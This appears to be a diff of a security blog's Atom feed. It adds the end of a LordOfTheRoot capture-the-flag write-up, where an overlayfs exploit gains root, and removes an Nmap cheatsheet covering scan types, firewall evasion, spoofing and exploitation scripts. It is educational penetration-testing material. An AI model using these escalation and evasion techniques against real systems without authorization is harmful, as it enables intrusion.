+<p>Lastly, we&rsquo;re back to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. It&rsquo;s just a matter of download, compile, run:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/tmp$ ./overlay 
+</span><span class='line'>root@LordOfTheRoot:/tmp# whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We owned Mordor! This was such an interesting challenge, learned many new things! Thanks to KookSec for this!</p>
+
+<h4>Learn more</h4>
+
+<ul>
+<li><p><a href="https://www.exploit-db.com/papers/13030/">ASLR bypassing</a></p></li>
+<li><p><a href="http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf">Linux Interactive Exploit Development with GDB and PEDA</a></p></li>
+<li><p><a href="https://www.exploit-db.com/exploits/39669/">disable ASLR trick</a></p></li>
+</ul>
+
+
+<p>Will leave you with this:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/legolas.jpg" title="legolas" alt="legolas"></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Automater - Kali Linux tools]]></title>
@@ -11549,223 +12763,6 @@ available, you can even conduct web app security checks just with Nmap!</p>
 </span><span class='line'>
 </span><span class='line'>
 </span><span class='line'>Apache HTTP Server            2012-02-10                HTTPD(8)</span></code></pre></td></tr></table></div></figure>
-
-
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Nmap cheatsheet]]></title>
-    <link href="http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet/"/>
-    <updated>2016-07-31T06:40:43-04:00</updated>
-    <id>http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet</id>
-    <content type="html"><![CDATA[<p>Recently, I&rsquo;ve been reading Fyodor&rsquo;s <a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717">Nmap Network Scanning</a> book and decided to create an Nmap cheatsheet while at it.</p>
-
-<p>Half of the book, including updated content, is also available for free on <a href="https://nmap.org/book/toc.html">https://nmap.org/book/toc.html</a></p>
-
-<p>Fyodor was also nice enough to set up a machine that you can test your scans against (within reasonable limits), at <a href="http://scanme.nmap.org/">http://scanme.nmap.org/</a></p>
-
-<p>All right, let&rsquo;s get scanning!</p>
-
-<!-- more -->
-
-
-<h1>Commands cheatsheet</h1>
-
-<h2>Scan types</h2>
-
-<p><strong>-sS</strong>: TCP SYN scan &ndash; the default scan, most popular due to its speed and stealth, as it doesn&rsquo;t complete a TCP connection</p>
-
-<p><strong>-sT</strong>: TCP Connect scan, it uses the connect() system call, used by unprivileged users who can&rsquo;t send raw packets or when scanning IPv6 targets</p>
-
-<p><strong>-sV</strong>: Version detection, omit for performance increase and/or stealth</p>
-
-<p><strong>-sA</strong>: TCP ACK scan, can&rsquo;t tell if the ports are open or closed, but it can determine whether firewall rules are stateful or stateless</p>
-
-<p><strong>-sW</strong>: TCP Window scan, same as ACK, but it can determine open and closed ports on certain systems</p>
-
-<p><strong>-sM</strong>: Maimon scan, yet another special scan type for bypassing firewalls</p>
-
-<p><strong>-sU</strong>: UDP scan. You can improve it by adding a version scan alongside it (but it will be slower)</p>
-
-<p><strong>-sF</strong>: FIN scan, sets the FIN bit, useful in bypassing some firewalls and determining the target&rsquo;s OS between Windows and Unix types, as it doesn&rsquo;t work against Windows</p>
-
-<p><strong>-sX</strong>: Xmas scan, another option for firewall evasion, sets the FIN, PSH, and URG flags, creating the impression of a lit Christmas tree</p>
-
-<p><strong>-sN</strong>: Null scan, doesn&rsquo;t set any flags, an additional option to evade pesky firewalls</p>
-
-<p><strong>-sO</strong>: IP protocol scan, check which IP protocols are supported on the target</p>
-
-<p><strong>-b <FTP relay host></strong>: FTP bounce scan, also available to unprivileged users</p>
-
-<p><strong>-A</strong>: Enable OS detection, version detection, script scanning, and traceroute</p>
-
-<h3>Host discovery</h3>
-
-<p><strong>List scan &ndash; sL</strong> &ndash; enumerates the addresses in the specified range and does reverse DNS lookup on them. Good for getting a feel about the targets by checking their DNS names, and maintaining a low profile on the network (because no ping requests are being sent yet, so it&rsquo;s stealthier)</p>
-
-<p><strong>-p-</strong>: Shortcut for <em>-p1-65535</em></p>
-
-<p><strong>-Pn</strong>: Treat all hosts as online &mdash; skip host discovery (disable ping)</p>
-
-<p><strong>&mdash;exclude &lt;host1[,host2][,host3],&hellip;></strong>: Exclude hosts/networks</p>
-
-<p><strong>-n</strong>: Never do DNS resolution</p>
-
-<p><strong>-sP</strong>: perform a ping sweep</p>
-
-<p><strong>-PS/PA/PU</strong>: TCP SYN ping/TCP ACK ping/UDP ping &ndash; various host discovery options for bypassing firewalls</p>
-
-<h3>Performance</h3>
-
-<p><strong>-T&lt;0-5></strong>: Set timing template (higher is faster). -T4 (aggressive) is recommended for most cases, as it improves performance and optimization for a fast and reliable network. For evasion purposes you can use T0 (paranoid) or T1 (sneaky), but speed will be very slow. To conserve bandwidth and resources you may use T2 (polite), at another significant expense of speed. T3 is the normal mode, and T5 is an insane level of speed (but you might sacrifice some accuracy in the process)</p>
-
-<p><strong>-F</strong>: Fast scan, only scan most common 100 ports</p>
-
-<h3>Evasion</h3>
-
-<p><strong>-D &lt;decoy1,decoy2[,ME],&hellip;></strong>: Cloak a scan with decoys</p>
-
-<p><strong>&mdash;scanflags <flags></strong>: Customize TCP scan flags. You can couple it with specifying a TCP scan type to give Nmap a base of interpreting the results</p>
-
-<p><strong>-S &lt;IP_Address></strong>: Spoof source address</p>
-
-<p><strong>-sI <zombie host[:probeport]></strong>: Idle scan, a complex scan that is stealthy but slow. It uses zombies to perform the scan, without sending packets directly from your IP. Use in tandem with the -PN option to disable ping and not disclose your real address. Avoid -sV, as version detection would also make your IP visible to the target</p>
-
-<p><strong>-f; &mdash;mtu <val></strong>: fragment packets (optionally w/given MTU), can aid in bypassing firewalls that don&rsquo;t handle fragmentation well</p>
-
-<p><strong>-g/&mdash;source-port <portnum></strong>: Spoof source port, bypass security measures that rely only on checking the source port</p>
-
-<p><strong>&mdash;spoof-mac <mac address/prefix/vendor name></strong>: Spoof your MAC address</p>
-
-<p><strong>&mdash;badsum</strong>: Send packets with a bogus TCP/UDP/SCTP checksum. Normal hosts discard packets with bad checksums, but firewalls may omit these checks for performance reasons</p>
-
-<p><strong>&mdash;dns-servers &lt;serv1[,serv2],&hellip;></strong>: Specify custom DNS servers when doing reverse DNS lookup to avoid your DNS server showing up in the target&rsquo;s logs</p>
-
-<h3>Additional info</h3>
-
-<p><strong>-v</strong>: increase verbosity level, you can use it 2 or 3 times to further increase verbosity</p>
-
-<p><strong>-d</strong>: Increase debugging level (use -dd or more for greater effect), can increase to a max of 9</p>
-
-<p><strong>&mdash;packet-trace</strong>: print summary of every packet sent and received</p>
-
-<h3>Output</h3>
-
-<p><strong>-oN/-oX/-oS/-oG <file></strong>: Output scan in normal, XML, sCrIpt kIddi3, and Grepable format, respectively, to the given filename</p>
-
-<p><strong>-oA <basename></strong>: Output in the three major formats at once</p>
-
-<p><strong>&mdash;resume <filename></strong>: Resume an aborted scan</p>
-
-<p>If you don&rsquo;t want Nmap to display its interactive output, you can pass a <em>&ndash;</em> to the format type(s), like so: <code>-oS &ndash;</code></p>
-
-<h2>Useful tips</h2>
-
-<ul>
-<li><p><code>nmap -sL -n target</code> &ndash; list IPs to be scanned before actually scanning them</p></li>
-<li><p><code>-pT:22,80,U:53</code> &ndash; scan separate TCP and UDP ports (you have to specify a UDP scan in addition to a TCP scan)</p></li>
-<li><p><code>&mdash;version-intensity <level></code>: Set from 0 (light) to 9 (try all probes), setting it to 0 will limit the version detection to the most likely to succeed probes, and improve the speed of the scan</p></li>
-<li><p>you can scan a network range by adding the subnet mask after an IP like so: <em>ip/numbits</em>. An example would be: 192.168.80.0/24, where the hosts between 192.168.80.0 and 192.168.80.255 would be scanned</p></li>
-<li><p>version detection is noisy</p></li>
-<li><p>you can specify port 0 for a scan, to catch malicious software that might listen on it</p></li>
-</ul>
-
-
-<h2>Script scanning</h2>
-
-<p><strong>-sC</strong>: enable some common scripts, may be intrusive to the target</p>
-
-<p><strong>&mdash;script</strong>=<Lua scripts>: <Lua scripts> is a comma separated list of directories, script-files or script-categories</p>
-
-<p><a href="https://nmap.org/book/nse-usage.html">Currently defined categories</a> are:</p>
-
-<ul>
-<li><p><em>auth</em> &ndash; operations requiring authentication credentials</p></li>
-<li><p><em>broadcast</em> &ndash; local network broadcasts</p></li>
-<li><p><em>brute</em> &ndash; brute force attacks</p></li>
-<li><p><em>default</em> &ndash; scripts that are run by default with -sC or -A options</p></li>
-<li><p><em>discovery</em> &ndash; additional network information and enumeration</p></li>
-<li><p><em>dos</em> &ndash; denial of service scripts</p></li>
-<li><p><em>exploit</em> &ndash; exploitation of some specific vulnerability</p></li>
-<li><p><em>external</em> &ndash; information may be sent to a third-party database or service</p></li>
-<li><p><em>fuzzer</em> &ndash; fuzzing scripts</p></li>
-<li><p><em>intrusive</em> &ndash; may crash the target system, consume excessive resources, or be perceived as malicious</p></li>
-<li><p><em>malware</em> &ndash; test if the target is infected by malware or backdoors</p></li>
-<li><p><em>safe</em> &ndash; general network discovery scripts that re unlikely to be resource intensive, crash a system, or lit the target logs on fire</p></li>
-<li><p><em>version</em> &ndash; scripts that run only with -sV enabled</p></li>
-<li><p><em>vuln</em> &ndash; check for specific vulnerabilities</p></li>
-</ul>
-
-
-<p>A full list of scripts and their description and usage can be found at <a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></p>
-
-<p>Some notable scripts that you might use more often are listed below.</p>
-
-<ul>
-<li><p>dns-zone-transfer &ndash; requests a zone transfer from a DNS server</p></li>
-<li><p>ftp-anon &ndash; checks if anonymous login is enabled on an FTP server and lists the root directory if yes</p></li>
-<li><p>ftp-bounce &ndash; checks if FTP server allows port scanning via the bounce method</p></li>
-<li><p>http-auth-finder &ndash; spiders a site to find pages containing form or HTTP authentication</p></li>
-<li><p>http-backup-finder &ndash; spiders a site to find backups of discovered files</p></li>
-<li><p>http-config-backup &ndash; searches for backups of web server and CMS configuration files</p></li>
-<li><p>http-csrf &ndash; checks for forms vulnerable to CSRF</p></li>
-<li><p>http-default-accounts &ndash; checks for default credentials in web applications, routers, and VOIP and security devices</p></li>
-<li><p>http-devframework &ndash; checks for the underlying framework of a site</p></li>
-<li><p>http-dlink-backdoor &ndash; checks for a firmware backdoor that is found in some D-Link routers</p></li>
-<li><p>http-dombased-xss &ndash; searches for places susceptible to DOM-based XSS</p></li>
-<li><p>http-drupal-enum-users &ndash; enumerates Drupal users</p></li>
-<li><p>http-enum &ndash; enumerates common directories found in web apps</p></li>
-<li><p>http-fileupload-exploiter &ndash; exploits file upload vulnerabilities</p></li>
-<li><p>http-mobileversion-checker &ndash; checks if the site has a mobile version</p></li>
-<li><p>http-open-redirect &ndash; checks for open redirects</p></li>
-<li><p>http-passwd &ndash; checks for directory traversal</p></li>
-<li><p>http-phpself-xss &ndash; finds PHP_SELF XSS vulnerabilities</p></li>
-<li><p>http-rfi-spider &ndash; searches for RFI in forms and URL parameters</p></li>
-<li><p>http-shellshock &ndash; checks if web app is vulnerable to shellshock</p></li>
-<li><p>http-sitemap-generator &ndash; crawls a site and lists its directory structure and files</p></li>
-<li><p>http-sql-injection &ndash; looks for SQLi in forms and URL parameters of HTTP servers</p></li>
-<li><p>http-stored-xss &ndash; searches for unfiltered input that might lead to XSS</p></li>
-<li><p>http-tplink-dir-traversal &ndash; on certain TPLINK routers that are vulnerable to directory traversal, it can read remote files with no authentication required</p></li>
-<li><p>http-unsafe-output-escaping &ndash; crawls a site looking for where improperly escaped data is reflected back to the user</p></li>
-<li><p>http-vuln-cve2012-1823 &ndash; attempts to exploit vulnerable PHP CGI apps that allow remote code execution</p></li>
-<li><p>http-vuln-cve2015-1635 &ndash; checks for the MS15-034 RCE vulnerability in Windows machines</p></li>
-<li><p>http-waf-detect &ndash; tries to detect IDS / IPS / WAF protection on the target</p></li>
-<li><p>http-waf-fingerprint &ndash; attempts to fingerpring the WAF</p></li>
-<li><p>http-webdav-scan &ndash; WebDAV detection</p></li>
-<li><p>ipidseq &ndash; tests for suitable zombies to be used in idle scan</p></li>
-<li><p>mongodb-databases &ndash; enumerates MongoDB tables</p></li>
-<li><p>ms-sql-empty-password &ndash; tries to login as the sa account with no password on MS-SQL</p></li>
-<li><p>mysql-empty-password &ndash; checks for MySQL servers with empty password for the root or anonymous account</p></li>
-<li><p>samba-vuln-cve-2012-1182 &ndash; checks if Samba server is vulnerable to CVE-2012-1182 heap overflow</p></li>
-<li><p>shodan-api &ndash; uses Shodan (API key needed) to scan targets in a way similar to the -sV scan</p></li>
-<li><p>sniffer-detect &ndash; checks if a NIC on the local network is in promiscuous mode</p></li>
-<li><p>ssl-heartbleed &ndash; checks for the Heartbleed vulnerability</p></li>
-<li><p>ssl-poodle &ndash; checks for the Poodle vulnerability</p></li>
-<li><p>tor-consensus-checker &ndash; checks if target host is a Tor node</p></li>
-<li><p>traceroute-geolocation &ndash; performs geolocation on traceroute hops</p></li>
-</ul>
-
-
-<p>Many thanks to Fyodor for creating such an awesome tool and freely sharing with everyone! As you can see, Nmap is so much more than just a port scanner. You can easily perform some sort of vulnerability analysis and exploitation with it, and if there is no task that you would like Nmap to do and it can&rsquo;t, you can write the code yourself and contribute to this amazing project.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>/ You have the capacity to learn from \
-</span><span class='line'>\ mistakes. You'll learn a lot today. /
-</span><span class='line'> -------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
 
 
 
